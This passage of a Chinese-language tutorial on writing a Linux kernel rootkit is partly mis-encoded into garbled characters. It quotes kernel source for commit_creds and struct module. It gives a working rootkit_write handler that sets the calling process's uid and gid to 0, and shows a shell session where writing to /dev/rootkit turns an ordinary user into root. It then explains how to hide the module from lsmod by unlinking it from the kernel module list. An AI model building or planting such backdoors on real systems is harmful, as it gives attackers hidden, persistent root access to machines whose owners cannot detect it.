old-&gt;fsgid))</span><br><span class="line">		key_fsgid_changed(<span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* do it</span></span><br><span class="line"><span class="comment">	 * RLIMIT_NPROC limits on user-&gt;processes have already been checked</span></span><br><span class="line"><span class="comment">	 * in set_user().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	alter_cred_subscribers(<span class="keyword">new</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">		inc_rlimit_ucounts(<span class="keyword">new</span>-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">	rcu_assign_pointer(task-&gt;real_cred, <span class="keyword">new</span>);</span><br><span class="line">	rcu_assign_pointer(task-&gt;cred, <span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">		dec_rlimit_ucounts(old-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">	alter_cred_subscribers(old, <span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* send notifications */</span></span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;uid,   old-&gt;uid)  ||</span><br><span class="line">	    !uid_eq(<span class="keyword">new</span>-&gt;euid,  old-&gt;euid) ||</span><br><span class="line">	    !uid_eq(<span class="keyword">new</span>-&gt;suid,  old-&gt;suid) ||</span><br><span class="line">	    !uid_eq(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">		proc_id_connector(task, PROC_EVENT_UID);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;gid,   old-&gt;gid)  ||</span><br><span class="line">	    !gid_eq(<span class="keyword">new</span>-&gt;egid,  old-&gt;egid) ||</span><br><span class="line">	    !gid_eq(<span class="keyword">new</span>-&gt;sgid,  old-&gt;sgid) ||</span><br><span class="line">	    !gid_eq(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">		proc_id_connector(task, PROC_EVENT_GID);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">	put_cred(old);</span><br><span class="line">	put_cred(old);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(commit_creds);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå…ˆå…³æ³¨ä¸€ä¸‹å‰é¢æåˆ°çš„<code>commit_creds</code>å‡½æ•°ï¼Œå‡½æ•°å¼€å¤´å…ˆé€šè¿‡<code>current</code>å®è·å–åˆ°<code>task_struct</code>ç»“æ„ä½“ï¼Œéšåè·å–åˆ°å†…éƒ¨çš„credï¼Œåé¢å°†<code>task_struct-&gt;real_cred</code>å’Œ<code>task_struct-&gt;cred</code>æˆå‘˜ä¿®æ”¹ä¸ºæ–°ä¼ å…¥çš„credï¼Œæœ€ç»ˆå®ç°äº†æƒé™æ”¹å˜ã€‚</p>
<p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦ç›´æ¥ä¿®æ”¹credç»“æ„ä½“æˆ‘ä»¬å¯ä»¥é€šè¿‡åŒæ ·çš„åŠæ³•è·å–å¾—åˆ°credç»“æ„ä½“å¹¶åŠ ä»¥ä¿®æ”¹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">rootkit_write</span><span class="params">(struct file *__file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line">    old-&gt;gid = old-&gt;sgid = old-&gt;egid = KGIDT_INIT(<span class="number">0</span>);</span><br><span class="line">    old-&gt;uid = old-&gt;suid = old-&gt;euid = KUIDT_INIT(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¾ˆç®€å•çš„å°±å¯ä»¥ä¿®æ”¹ä¸Šè¿°å‡½æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~ $ id</span><br><span class="line">uid=<span class="number">1000</span>(ctf) gid=<span class="number">1000</span>(ctf) groups=<span class="number">1000</span>(ctf)</span><br><span class="line">~ $ echo a &gt; /dev/rootkit </span><br><span class="line">~ <span class="meta"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">1000</span>(ctf)</span><br><span class="line">~ # </span><br></pre></td></tr></table></figure>

<p>éšåæˆåŠŸææƒã€‚</p>
<h2 id="æ¨¡å—éšè—"><a href="#æ¨¡å—éšè—" class="headerlink" title="æ¨¡å—éšè—"></a>æ¨¡å—éšè—</h2><p>ç›®å‰å­˜åœ¨ä¸€ä¸ªååˆ†å°´å°¬çš„é—®é¢˜å°±æ˜¯æˆ‘ä»¬è½½å…¥rootkitæ—¶ä¼šå‘ç°åªéœ€è¦lsmodå°±å¯ä»¥çœ‹åˆ°äº†</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~ $ lsmod </span><br><span class="line">rootkit 16384 0 - Live 0x0000000000000000 (E)</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure>

<p>å½“ç„¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>very_important_module_not_root_kit_please_donot_remove_it</code>å–ä¸€ä¸ªéå¸¸æ­£å¸¸çš„åå­—è®©ç”¨æˆ·ä¸ä¼šçŒœæµ‹æˆ‘ä»¬ï¼Œä½†æ˜¯è¿™æ ·ä¹Ÿä¸èƒ½å®Œå…¨ä¿è¯ä¸è¢«å‘ç°ã€‚æ‰€ä»¥æœ€å¥½çš„åŠæ³•å°±æ˜¯è®©ç”¨æˆ·æ— æ³•ç›´æ¥å‘ç°æˆ‘ä»¬çš„rootkitã€‚</p>
<h3 id="proc-modulesä¿¡æ¯éšè—"><a href="#proc-modulesä¿¡æ¯éšè—" class="headerlink" title="/proc/modulesä¿¡æ¯éšè—"></a>/proc/modulesä¿¡æ¯éšè—</h3><p>Linux ä¸‹ç”¨ä»¥æŸ¥çœ‹æ¨¡å—çš„å‘½ä»¤ <code>lsmod</code> å…¶å®æ˜¯ä» <code>/proc/modules</code> è¿™ä¸ªæ–‡ä»¶ä¸­è¯»å–å¹¶è¿›è¡Œæ•´ç†ï¼Œè¯¥æ–‡ä»¶çš„å†…å®¹æ¥è‡ªäºå†…æ ¸ä¸­çš„ module åŒå‘é“¾è¡¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å°† rootkit ä»åŒå‘é“¾è¡¨ä¸­ç§»é™¤å³å¯å®Œæˆ procfs ä¸­çš„éšè—ã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œå°±ç®€å•ä»‹ç»ä¸€ä¸‹å†…æ ¸ä¸­çš„<code>module</code>åŒå‘é“¾è¡¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">module_state</span> <span class="title">state</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Member of list of modules */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Unique handle for this module */</span></span><br><span class="line">	<span class="keyword">char</span> name[MODULE_NAME_LEN];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_STACKTRACE_BUILD_ID</span></span><br><span class="line">	<span class="comment">/* Module build ID */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> build_id[BUILD_ID_SIZE_MAX];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Sysfs stuff. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module_kobject</span> <span class="title">mkobj</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module_attribute</span> *<span class="title">modinfo_attrs</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *version;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *srcversion;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> *<span class="title">holders_dir</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Exported symbols */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> *<span class="title">syms</span>;</span></span><br><span class="line">	<span class="keyword">const</span> s32 *crcs;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_syms;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ARCH_USES_CFI_TRAPS</span></span><br><span class="line">	s32 *kcfi_traps;</span><br><span class="line">	s32 *kcfi_traps_end;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Kernel parameters. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">param_lock</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kernel_param</span> *<span class="title">kp</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_kp;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* GPL-only exported symbols. */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_gpl_syms;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> *<span class="title">gpl_syms</span>;</span></span><br><span class="line">	<span class="keyword">const</span> s32 *gpl_crcs;</span><br><span class="line">	<span class="keyword">bool</span> using_gplonly_symbols;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULE_SIG</span></span><br><span class="line">	<span class="comment">/* Signature was verified. */</span></span><br><span class="line">	<span class="keyword">bool</span> sig_ok;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> async_probe_requested;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Exception table */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_exentries;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">exception_table_entry</span> *<span class="title">extable</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Startup function. */</span></span><br><span class="line">	<span class="keyword">int</span> (*init)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module_memory</span> <span class="title">mem</span>[<span class="title">MOD_MEM_NUM_TYPES</span>] __<span class="title">module_memory_align</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Arch-specific module values */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mod_arch_specific</span> <span class="title">arch</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> taints;	<span class="comment">/* same bits as kernel:taint_flags */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_GENERIC_BUG</span></span><br><span class="line">	<span class="comment">/* Support for BUG */</span></span><br><span class="line">	<span class="keyword">unsigned</span> num_bugs;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">bug_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bug_entry</span> *<span class="title">bug_table</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KALLSYMS</span></span><br><span class="line">	<span class="comment">/* Protected by RCU and/or module_mutex: use rcu_dereference() */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mod_kallsyms</span> __<span class="title">rcu</span> *<span class="title">kallsyms</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mod_kallsyms</span> <span class="title">core_kallsyms</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Section attributes */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module_sect_attrs</span> *<span class="title">sect_attrs</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Notes attributes */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module_notes_attrs</span> *<span class="title">notes_attrs</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The command line arguments (may be mangled).  People like</span></span><br><span class="line"><span class="comment">	   keeping pointers to this stuff */</span></span><br><span class="line">	<span class="keyword">char</span> *args;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	<span class="comment">/* Per-cpu data. */</span></span><br><span class="line">	<span class="keyword">void</span> __percpu *percpu;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> percpu_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">void</span> *noinstr_text_start;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> noinstr_text_size;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TRACEPOINTS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_tracepoints;</span><br><span class="line">	<span class="keyword">tracepoint_ptr_t</span> *tracepoints_ptrs;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TREE_SRCU</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_srcu_structs;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">srcu_struct</span> **<span class="title">srcu_struct_ptrs</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BPF_EVENTS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_bpf_raw_events;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_raw_event_map</span> *<span class="title">bpf_raw_events</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_INFO_BTF_MODULES</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> btf_data_size;</span><br><span class="line">	<span class="keyword">void</span> *btf_data;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_JUMP_LABEL</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">jump_entry</span> *<span class="title">jump_entries</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_jump_entries;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TRACING</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_trace_bprintk_fmt;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> **trace_bprintk_fmt_start;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_EVENT_TRACING</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">trace_event_call</span> **<span class="title">trace_events</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_trace_events;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">trace_eval_map</span> **<span class="title">trace_evals</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_trace_evals;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FTRACE_MCOUNT_RECORD</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_ftrace_callsites;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *ftrace_callsites;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KPROBES</span></span><br><span class="line">	<span class="keyword">void</span> *kprobes_text_start;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> kprobes_text_size;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *kprobe_blacklist;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_kprobe_blacklist;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HAVE_STATIC_CALL_INLINE</span></span><br><span class="line">	<span class="keyword">int</span> num_static_call_sites;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">static_call_site</span> *<span class="title">static_call_sites</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_ENABLED(CONFIG_KUNIT)</span></span><br><span class="line">	<span class="keyword">int</span> num_kunit_suites;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kunit_suite</span> **<span class="title">kunit_suites</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LIVEPATCH</span></span><br><span class="line">	<span class="keyword">bool</span> klp; <span class="comment">/* Is this a livepatch module? */</span></span><br><span class="line">	<span class="keyword">bool</span> klp_alive;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ELF information */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">klp_modinfo</span> *<span class="title">klp_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PRINTK_INDEX</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> printk_index_size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pi_entry</span> **<span class="title">printk_index_start</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULE_UNLOAD</span></span><br><span class="line">	<span class="comment">/* What modules depend on me? */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">source_list</span>;</span></span><br><span class="line">	<span class="comment">/* What modules do I depend on? */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">target_list</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Destruction function. */</span></span><br><span class="line">	<span class="keyword">void</span> (*<span class="built_in">exit</span>)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">atomic_t</span> refcnt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSTRUCTORS</span></span><br><span class="line">	<span class="comment">/* Constructor functions. */</span></span><br><span class="line">	<span class="keyword">ctor_fn_t</span> *ctors;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_ctors;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FUNCTION_ERROR_INJECTION</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">error_injection_entry</span> *<span class="title">ei_funcs</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> num_ei_funcs;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DYNAMIC_DEBUG_CORE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">ddebug_info</span> <span class="title">dyndbg_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; ____cacheline_aligned __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>é‡Œé¢åŒ…å«äº†<code>module</code>ä¿¡æ¯çš„ä¸€äº›æˆå‘˜ï¼Œå¹¶ä¸”å¤šä¸ªå†…æ ¸æ¨¡å—æ˜¯é€šè¿‡ä¸Šé¢ç»“æ„ä½“ä¸­çš„<code>list</code>æˆå‘˜æ„æˆçš„åŒå‘é“¾è¡¨ç»“æ„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">module_class = class_create(THIS_MODULE, CLASS_NAME);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(module_class))</span><br><span class="line">&#123;</span><br><span class="line">  unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">  <span class="keyword">return</span> PTR_ERR(module_class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨lkmç¼–ç¨‹ä¸­ï¼Œå¯ä»¥æ³¨æ„åˆ°çš„æ—¶å€™è¿™é‡Œåˆ›å»º<code>class</code>æ—¶ä½¿ç”¨<code>THIS_MODULE</code>å®šä½äº†å½“å‰çš„æ¨¡å—ï¼Œå±•å¼€å…¶å®šä¹‰å…¶å®å°±æ˜¯<code>(&amp;__this_module)</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">module</span> __<span class="title">this_module</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THIS_MODULE (&amp;__this_module)</span></span><br></pre></td></tr></table></figure>

<p>å‰é¢æåˆ°/proc/modulesçš„å†…å®¹æ¥è‡ªå†…æ ¸ä¸­ä¸Šè¿°çš„åŒå‘é“¾è¡¨ç»“æ„ä¸­ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è®©æˆ‘ä»¬çš„<code>rootkit</code>è„±é“¾å³å¯å®Œæˆéšè—æ“ä½œã€‚</p>
<p>å¯ä»¥æ³¨æ„åˆ°çš„æ˜¯è¿™é‡Œçš„<code>list</code>æˆå‘˜å®šä¹‰çš„ç»“æ„æ˜¯<code>list_head</code>ç»“æ„ï¼Œè€Œè¯¥ç±»å‹çš„æˆå‘˜åœ¨ä»¥å¾€çš„å†…æ ¸æ–‡ç« ä¸­åº”è¯¥ä»‹ç»è¿‡å¯ä»¥ä½¿ç”¨<code>list_del_rcu</code>å‡½æ•°ç›´æ¥è¿›è¡Œåˆ é™¤ï¼Œä¸è¿‡è¿™é‡Œæ˜¯å†…æ ¸ç¯å¢ƒæ‰€ä»¥è€ƒè™‘å¤šçº¿ç¨‹æ“ä½œçš„å½±å“æ˜¯å¿…è¦çš„ã€‚</p>
